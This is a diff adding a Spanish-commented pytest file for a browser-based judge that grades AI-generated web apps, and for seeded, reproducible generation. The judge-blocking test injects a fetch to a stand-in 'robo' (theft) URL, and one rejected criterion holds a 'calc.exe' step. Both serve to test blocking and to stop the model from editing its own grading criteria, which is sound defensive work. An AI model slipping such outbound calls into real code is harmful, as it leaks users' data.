@@ -1,0 +1,218 @@
+"""Juez funcional dentro de verify (B1) y generación reproducible (B2), PLAN_DEFINITIVO.md."""
+import json
+import shutil
+import subprocess
+from pathlib import Path
+
+import pytest
+
+from eolfi import cli, rsi_banco
+from eolfi.generador import juez, llm
+from eolfi.generador.assist import _allowed, assist
+from eolfi.generador.verify import verify
+from tests.test_assist import FakeClient, _project
+
+BS = chr(92)
+CRITERIOS = {"version": 1, "pagina": "index.html", "pasos": [
+    {"escribir": {"selector": "#t", "texto": "comprar pan", "intro": True}},
+    {"comprobar": "añade la tarea", "presente": "comprar pan"},
+    {"comprobar": "el resumen cuenta 1", "selector": "#resumen", "patron": BS + "b1" + BS + "b"},
+    {"comprobar": "clic marca como hecha", "cambia_al_clic": "comprar pan"},
+    {"clic": {"selector": "button", "en": "comprar pan"}},
+    {"comprobar": "borrar quita la tarea", "ausente": "comprar pan"},
+    {"recargar": True},
+    {"comprobar": "una sola lista", "selector": "ul", "cuenta": 1},
+    {"comprobar": "sin errores de JavaScript", "sin_errores_js": True}]}
+HTML = ('<!doctype html><html lang="es"><meta charset="utf-8">'
+        '<meta http-equiv="Content-Security-Policy" content="default-src ' + "'self'" + '"><title>t</title>'
+        '<main><h1>Tareas</h1><form id="f"><input type="text" id="t" aria-label="Tarea"><button>Añadir</button></form>'
+        '<p id="resumen"></p><ul id="l"></ul></main><script src="app.js"></script></html>')
+JS = """let ts = JSON.parse(localStorage.getItem('ts') || '[]');
+const pinta = () => { localStorage.setItem('ts', JSON.stringify(ts)); const l = document.getElementById('l'); l.replaceChildren();
+  ts.forEach((t, i) => { const li = document.createElement('li'); const s = document.createElement('span'); s.textContent = t.x;
+    if (t.h) s.style.textDecoration = 'line-through'; s.addEventListener('click', () => { t.h = !t.h; pinta(); });
+    const b = document.createElement('button'); b.textContent = 'Borrar'; b.addEventListener('click', () => { BORRAR });
+    li.append(s, b); l.append(li); });
+  document.getElementById('resumen').textContent = ts.filter((t) => !t.h).length + ' pendientes'; };
+document.getElementById('f').addEventListener('submit', (e) => { e.preventDefault(); const i = document.getElementById('t');
+  if (i.value.trim()) ts.push({ x: i.value.trim(), h: false }); i.value = ''; pinta(); });
+pinta();
+"""
+con_navegador = pytest.mark.skipif(not shutil.which("node") or juez._playwright() is None,
+                                   reason="requiere Node.js y playwright-core")
+
+
+def _app(d: Path, *, rota: bool = False, extra: str = "") -> Path:
+    d.mkdir(parents=True, exist_ok=True)
+    (d / "index.html").write_text(HTML, encoding="utf-8")
+    (d / "app.js").write_text(JS.replace("BORRAR", "noExiste();" if rota else "ts.splice(i, 1); pinta();") + extra,
+                              encoding="utf-8")
+    (d / juez.ARCHIVO).write_text(json.dumps(CRITERIOS), encoding="utf-8")
+    return d
+
+
+def test_validar_acepta_lo_declarado_y_rechaza_lo_demas():
+    assert juez.validar(CRITERIOS)["pasos"][0]["escribir"]["intro"] is True
+    malos = [
+        {}, {"version": 2, "pasos": []}, {"version": 1, "pasos": []},
+        {"version": 1, "pagina": "../fuera.html", "pasos": [{"comprobar": "x", "presente": "y"}]},
+        {"version": 1, "pagina": "app.js", "pasos": [{"comprobar": "x", "presente": "y"}]},
+        {"version": 1, "pasos": [{"recargar": True}]},                                  # sin comprobaciones
+        {"version": 1, "pasos": [{"comprobar": "x"}]},
+        {"version": 1, "pasos": [{"comprobar": "x", "presente": "a", "ausente": "b"}]},
+        {"version": 1, "pasos": [{"comprobar": "x", "selector": "p", "patron": "("}]},
+        {"version": 1, "pasos": [{"comprobar": "x", "selector": "p", "patron": "\x082\x08"}]},   # «\b» sin duplicar
+        {"version": 1, "pasos": [{"comprobar": "x", "selector": "p", "cuenta": "2"}]},
+        {"version": 1, "pasos": [{"ejecutar": "calc.exe"}, {"comprobar": "x", "presente": "y"}]},
+        {"version": 1, "pasos": [{"comprobar": "x", "presente": "y"}] * (juez.MAX_PASOS + 1)},
+    ]
+    for malo in malos:
+        with pytest.raises(juez.JuezError):
+            juez.validar(malo)
+
+
+def test_paso_sin_criterios_invalidos_destino_y_desactivado(tmp_path, monkeypatch):
+    assert juez.paso(tmp_path, "static") is None
+    (tmp_path / juez.ARCHIVO).write_text("{no es json", encoding="utf-8")
+    p = juez.paso(tmp_path, "static")
+    assert p["exit"] == 1 and "inválidos" in p["tail"]
+    (tmp_path / juez.ARCHIVO).write_text(json.dumps(CRITERIOS), encoding="utf-8")
+    p = juez.paso(tmp_path, "react")
+    assert p["exit"] == 1 and "aún no cubre" in p["tail"]              # un juez que no corre no aprueba
+    monkeypatch.setattr(juez.shutil, "which", lambda _n: None)
+    assert juez.paso(tmp_path, "static")["exit"] == 1
+    monkeypatch.setenv("EOLFI_JUEZ", "0")
+    p = juez.paso(tmp_path, "static")
+    assert p["exit"] == 0 and "NO VERIFICADO" in p["step"]
+
+
+def test_el_modelo_no_puede_escribir_los_criterios():
+    for destino in ("static", "react", "fastapi"):
+        assert not _allowed(destino, "eolfi.juez.json")
+    assert not _allowed("static", "tests/../eolfi.juez.json")
+
+
+@con_navegador
+def test_juez_real_aprueba_la_app_que_funciona_y_explica_la_rota(tmp_path):
+    bien = juez.paso(_app(tmp_path / "bien"), "static")
+    assert (bien["exit"], bien["step"]) == (0, "juez funcional (6/6)"), bien["tail"]
+    roto = juez.paso(_app(tmp_path / "roto", rota=True), "static")
+    assert roto["exit"] == 1 and roto["judge"]["passed"] < 6
+    assert "NO: borrar quita la tarea" in roto["tail"] and "noExiste is not defined" in roto["tail"]
+
+
+@con_navegador
+def test_juez_real_corta_las_peticiones_hacia_fuera(tmp_path):
+    d = _app(tmp_path / "sale", extra="fetch('http://example.invalid/robo?x=1').catch(() => {});\n")
+    # Sin CSP en la página (con ella, el navegador ya corta la petición antes): aquí quien corta es el juez.
+    (d / "index.html").write_text(HTML.replace('<meta http-equiv="Content-Security-Policy" content="default-src '
+                                               + "'self'" + '">', ""), encoding="utf-8")
+    p = juez.paso(d, "static")
+    assert p["exit"] == 0, p["tail"]
+    assert p["judge"]["peticiones_bloqueadas"] == ["http://example.invalid/robo?x=1"]
+
+
+def test_verify_no_queda_en_verde_si_el_juez_falla(tmp_path, monkeypatch):
+    if not shutil.which("node"):
+        pytest.skip("requiere Node.js")
+    out = _project(tmp_path)
+    assert verify(out, "static")["ok"] and "judge" not in verify(out, "static")
+    juez.instalar(out, _criterios(tmp_path))
+    notas = iter([{"status": "ok", "total": 6, "passed": 4, "ejecutadas": 6, "seconds": 1,
+                   "checks": [{"nombre": "añade la tarea", "ok": False, "detalle": "no aparece"}]},
+                  {"status": "ok", "total": 6, "passed": 6, "ejecutadas": 6, "seconds": 1, "checks": []},
+                  {"status": "unavailable", "total": 6, "passed": 0, "error": "sin navegador"}])
+    monkeypatch.setattr(juez, "juzgar", lambda *a, **k: next(notas))
+    v = verify(out, "static")
+    assert v["ok"] is False and v["judge"]["passed"] == 4
+    assert v["steps"][-1]["step"] == "juez funcional (4/6)" and "NO: añade la tarea (no aparece)" in v["steps"][-1]["tail"]
+    assert verify(out, "static")["ok"] is True
+    v = verify(out, "static")
+    assert v["ok"] is False and "no pudo ejecutarse" in v["steps"][-1]["tail"]
+
+
+def _criterios(tmp_path) -> Path:
+    f = tmp_path / "criterios.json"
+    f.write_text(json.dumps(CRITERIOS), encoding="utf-8")
+    return f
+
+
+def test_la_reparacion_ve_que_comprobacion_falla(tmp_path, monkeypatch):
+    if not shutil.which("node"):
+        pytest.skip("requiere Node.js")
+    out = _project(tmp_path)
+    juez.instalar(out, _criterios(tmp_path))
+    notas = iter([{"status": "ok", "total": 6, "passed": 5, "ejecutadas": 6, "seconds": 1,
+                   "checks": [{"nombre": "borrar quita la tarea", "ok": False}]},
+                  {"status": "ok", "total": 6, "passed": 6, "ejecutadas": 6, "seconds": 1, "checks": []}])
+    monkeypatch.setattr(juez, "juzgar", lambda *a, **k: next(notas))
+    html = (out / "index.html").read_text(encoding="utf-8")
+    cambio = {"summary": "tareas", "notes": [], "files": [
+        {"path": "index.html", "content": html.replace("</main>", "<p>tareas</p></main>")},
+        {"path": "eolfi.juez.json", "content": "{}"}]}                       # intento de cambiar los criterios
+    cliente = FakeClient([cambio, cambio])
+    r = assist(out, "Implementa la lista de tareas", provider=cliente)
+    assert r["ok"] and len(r["rounds"]) == 2
+    assert r["rounds"][0]["failed_step"] == "juez funcional (5/6)" and "eolfi.juez.json" in r["rounds"][0]["rejected"]
+    assert r["rounds"][0]["verification"]["judge"] == {"status": "ok", "passed": 5, "total": 6}
+    assert "NO: borrar quita la tarea" in cliente.calls[1]["messages"][-1]["content"]
+    assert juez.cargar(out) == juez.validar(CRITERIOS)                       # intactos
+
+
+def test_create_rechaza_criterios_invalidos_antes_de_empezar(tmp_path, capsys):
+    f = tmp_path / "malo.json"
+    f.write_text('{"version": 1, "pasos": []}', encoding="utf-8")
+    assert cli.main(["--db", str(tmp_path / "x.db"), "create", "--from", str(tmp_path), "--out", str(tmp_path / "o"),
+                     "--juez", str(f)]) == 2
+    assert "criterios del juez inválidos" in capsys.readouterr().err
+    assert not (tmp_path / "o").exists()
+
+
+# ── B2: generación reproducible ─────────────────────────────────────────────────────────────────────────────────
+
+def test_semilla_solo_cuando_se_pide(monkeypatch):
+    monkeypatch.delenv("EOLFI_SEMILLA", raising=False)
+    assert llm.semilla() is None and llm.determinista({"temperature": 0.2}) == {"temperature": 0.2}
+    monkeypatch.setenv("EOLFI_SEMILLA", "7")
+    assert llm.determinista({"temperature": 0.2, "top_p": 0.9}) == {"temperature": 0, "top_p": 0.9, "seed": 7}
+    for malo in ("siete", "-1", str(2**31)):
+        monkeypatch.setenv("EOLFI_SEMILLA", malo)
+        with pytest.raises(llm.LLMError):
+            llm.semilla()
+
+
+def test_eolas_v1_recibe_semilla_y_temperatura_cero(monkeypatch):
+    enviados = []
+
+    def post(url, body, headers, timeout, **kw):
+        enviados.append(body)
+        return {"message": {"content": '{"summary": "", "notes": [], "files": []}'}}
+    monkeypatch.setattr(llm, "_post", post)
+    p = llm.OllamaProvider("http://servidor.invalid:11434", "modelo")
+    p.complete("s", [{"role": "user", "content": "x"}], {"type": "object"}, "high")
+    monkeypatch.setenv("EOLFI_SEMILLA", "3")
+    p.complete("s", [{"role": "user", "content": "x"}], {"type": "object"}, "high")
+    assert enviados[0]["options"]["temperature"] == 0.2 and "seed" not in enviados[0]["options"]
+    assert (enviados[1]["options"]["temperature"], enviados[1]["options"]["seed"]) == (0, 3)
+
+
+def test_el_banco_pasa_criterios_y_semilla_y_anota_el_mejor_intento(monkeypatch):
+    vistos = []
+    rep = {"assist": {"ok": False, "rounds": [
+        {"verification": {"ok": False, "judge": {"status": "ok", "passed": 4, "total": 10}}},
+        {"verification": {"ok": False, "judge": {"status": "ok", "passed": 7, "total": 10}}}]}}
+
+    def run(cmd, **kw):
+        vistos.append((cmd, kw.get("env", {})))
+        return subprocess.CompletedProcess(cmd, 6, "progreso\n" + json.dumps(rep), "")
+    monkeypatch.setattr(rsi_banco.subprocess, "run", run)
+    notas = []
+    assert rsi_banco.banco_tareas(proveedor="eolas-v2", registro=notas.append)(4) == 0.0
+    cmd, env = vistos[0]
+    assert cmd[cmd.index("--juez") + 1] == str(rsi_banco.CRITERIOS) and env["EOLFI_SEMILLA"] == "4"
+    assert notas[0]["mejor_juez_verify"] == "7/10" and notas[0]["rondas"] == 2 and notas[0]["semilla"] == 4
+    rsi_banco.banco_tareas(proveedor="eolas-v2", juez_en_verify=False)()
+    cmd, env = vistos[1]
+    assert "--juez" not in cmd and "EOLFI_SEMILLA" not in {k for k in env if env[k] != __import__("os").environ.get(k)}
+    assert sum(1 for p in juez.validar(json.loads(rsi_banco.CRITERIOS.read_text(encoding="utf-8")))["pasos"]
+               if "comprobar" in p) == 10
